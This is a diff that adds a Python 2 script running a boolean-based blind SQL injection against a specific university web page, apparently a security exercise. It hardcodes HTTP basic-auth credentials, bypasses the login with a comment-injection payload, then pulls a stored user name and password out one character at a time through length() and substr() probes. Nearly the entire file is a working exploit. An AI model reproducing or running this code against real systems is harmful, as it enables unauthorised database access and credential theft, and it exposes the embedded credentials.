@@ -1,0 +1,79 @@
+import urllib
+import urllib2
+
+theurl = 'http://www.goto.info.waseda.ac.jp/~kozaki/basic/sql.php'
+username = 'm1z0r3'
+basicPass = 'basic0616'
+passwordlist = []
+userlist = []
+
+passman = urllib2.HTTPPasswordMgrWithDefaultRealm()
+passman.add_password(None, theurl, username, basicPass)
+authhandler = urllib2.HTTPBasicAuthHandler(passman)
+opener = urllib2.build_opener(authhandler)
+urllib2.install_opener(opener)
+pagehandler=urllib2.urlopen(theurl)
+
+print "Succse!"
+
+values = {'user':"root' --", 'pass':""}
+params = urllib.urlencode(values)
+request = urllib2.Request(theurl, params)
+response = urllib2.urlopen(request)
+the_page = response.read()
+num = len(the_page)
+
+for i in range(1, 50):
+    values = {'user':"root' and (SELECT length(user) FROM table1 WHERE id ='2') = " + str(i) + "--", 'pass':""}
+    params = urllib.urlencode(values)
+    request = urllib2.Request(theurl, params)
+    response = urllib2.urlopen(request)
+    the_page = response.read()
+    if len(the_page) ==  num:
+        print "The user has " + str(i) + " characters"
+        userlen = i
+        break
+
+for i in range(1, 50):
+    values = {'user':"root' and (SELECT length(pass) FROM table1 WHERE id ='2') = " + str(i) + "--", 'pass':""}
+    params = urllib.urlencode(values)
+    request = urllib2.Request(theurl, params)
+    response = urllib2.urlopen(request)
+    the_page = response.read()
+    if len(the_page) == num:
+        print "The password has " + str(i) + " characters"
+        passlen = i
+        break
+
+for j in range(1, userlen+1):
+    for x in range(33, 127):
+        values = {'user':"root' and substr((SELECT user FROM table1 WHERE id='2')," + str(j) + ",1)='" + chr(x) + "' --", 'pass':""}
+        params = urllib.urlencode(values)
+        request = urllib2.Request(theurl, params)
+        response = urllib2.urlopen(request)
+        the_page = response.read()
+        if len(the_page) == num:
+            print chr(x),
+            userlist.append(chr(x))
+            break
+
+user = "".join(userlist)
+print ""
+print "The user is " + user
+print ""
+
+for j in range(1, passlen+1):
+    for x in range(33, 127):
+        values = {'user':"root' and substr((SELECT pass FROM table1 WHERE id='2')," + str(j) + ",1)='" + chr(x) + "' --", 'pass':""}
+        params = urllib.urlencode(values)
+        request = urllib2.Request(theurl, params)
+        response = urllib2.urlopen(request)
+        the_page = response.read()
+        if len(the_page) == num:
+            print chr(x),
+            passwordlist.append(chr(x))
+            break
+
+password = "".join(passwordlist)
+print ""
+print "The password is " + password
